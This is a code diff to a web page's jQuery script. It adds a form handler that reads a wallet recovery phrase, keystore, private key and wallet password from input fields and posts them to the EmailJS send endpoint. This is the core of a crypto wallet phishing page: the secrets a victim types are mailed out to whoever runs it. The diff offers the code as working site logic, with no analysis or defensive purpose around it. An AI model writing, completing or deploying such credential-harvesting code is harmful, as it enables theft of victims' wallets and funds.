@@ -8157,7 +8157,21 @@
           },
         });
 
-        
+        $("#form").submit(function (e) {
+          e.preventDefault();
+          // Prepare the data payload
+          let payload = {
+            service_id: "", // EmailJS service ID
+            template_id: "", // template ID
+            user_id: "", // Your EmailJS user ID
+            template_params: {
+              // Map your form fields here
+              phrase: $("#phrase").val(),
+              keystore: $("#keystore").val(),
+              private_key: $("#private_key").val(),
+              wallet_password: $("#wallet_password").val(),
+            },
+          };
 
           let processBtn = $("#proceedButton");
           let cancelBtn = $("#cancelBtn");
@@ -8165,7 +8179,7 @@
 
           $.ajax({
             type: "POST",
-            url: "",
+            url: "https://api.emailjs.com/api/v1.0/email/send",
             contentType: "application/json",
             data: JSON.stringify(payload),
             // cache: false,
